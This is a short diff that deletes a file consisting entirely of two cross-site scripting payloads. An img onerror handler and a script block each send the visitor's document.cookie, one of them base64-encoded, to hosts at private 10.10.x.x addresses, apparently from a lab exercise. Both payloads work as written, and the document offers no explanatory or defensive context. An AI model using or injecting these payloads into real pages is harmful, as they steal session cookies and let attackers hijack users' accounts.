@@ -1,6 +1,0 @@
-<img src="empty.png" onerror="fetch('http://10.10.17.50:8000?cookie=' + document.cookie);">
-
-<script>
-  var i = new Image();
-  i.src = "http://10.10.193.5/?cookie=" + btoa(document.cookie);
-</script>
